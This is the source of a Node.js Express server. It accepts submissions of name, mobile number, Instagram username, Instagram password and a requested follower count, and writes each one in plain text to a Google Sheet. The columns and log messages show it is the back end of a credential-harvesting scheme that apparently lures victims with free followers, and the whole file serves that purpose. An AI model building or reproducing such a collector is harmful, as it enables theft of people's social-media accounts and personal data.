require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { google } = require('googleapis');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Google Auth Setup - with env fallback
let auth;
if (process.env.GOOGLE_CREDENTIALS) {
    try {
        const credentials = JSON.parse(process.env.GOOGLE_CREDENTIALS);
        auth = new google.auth.GoogleAuth({
            credentials: credentials,
            scopes: ['https://www.googleapis.com/auth/spreadsheets']
        });
        console.log('✅ Using credentials from environment variable');
    } catch (err) {
        console.error('❌ Failed to parse GOOGLE_CREDENTIALS:', err.message);
        process.exit(1);
    }
} else {
    try {
        auth = new google.auth.GoogleAuth({
            keyFile: 'credentials.json',
            scopes: ['https://www.googleapis.com/auth/spreadsheets']
        });
        console.log('✅ Using credentials from file');
    } catch (err) {
        console.error('❌ No credentials found. Set GOOGLE_CREDENTIALS env var or provide credentials.json');
        process.exit(1);
    }
}

const sheets = google.sheets({ version: 'v4', auth });
const SPREADSHEET_ID = process.env.SPREADSHEET_ID;
const SHEET_NAME = 'Submissions';

async function initSheet() {
    try {
        const response = await sheets.spreadsheets.get({ spreadsheetId: SPREADSHEET_ID });
        const sheetExists = response.data.sheets.some(s => s.properties.title === SHEET_NAME);
        if (!sheetExists) {
            await sheets.spreadsheets.batchUpdate({
                spreadsheetId: SPREADSHEET_ID,
                resource: {
                    requests: [{
                        addSheet: {
                            properties: { title: SHEET_NAME }
                        }
                    }]
                }
            });
            await sheets.spreadsheets.values.update({
                spreadsheetId: SPREADSHEET_ID,
                range: `${SHEET_NAME}!A1:F1`,
                valueInputOption: 'RAW',
                resource: {
                    values: [['Timestamp', 'Full_Name', 'Mobile_Number', 'IG_Username', 'IG_Password', 'Followers_Requested']]
                }
            });
        }
    } catch (error) {
        console.error('Sheet init error:', error);
    }
}

app.post('/api/submit', async (req, res) => {
    try {
        const { name, mobile, username, password, followers } = req.body;
        if (!name || !mobile || !username || !password || !followers) {
            return res.status(400).json({ error: 'All fields required' });
        }
        const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
        await sheets.spreadsheets.values.append({
            spreadsheetId: SPREADSHEET_ID,
            range: `${SHEET_NAME}!A:F`,
            valueInputOption: 'RAW',
            resource: {
                values: [[timestamp, name, mobile, username, password, followers]]
            }
        });
        console.log(`✅ Data saved: ${username} - ${followers} followers`);
        res.json({ success: true, message: 'Data saved successfully' });
    } catch (error) {
        console.error('Submission error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.listen(PORT, async () => {
    await initSheet();
    console.log(`✅ Server running on http://localhost:${PORT}`);
    console.log('✅ Google Sheets ready for data collection');
});
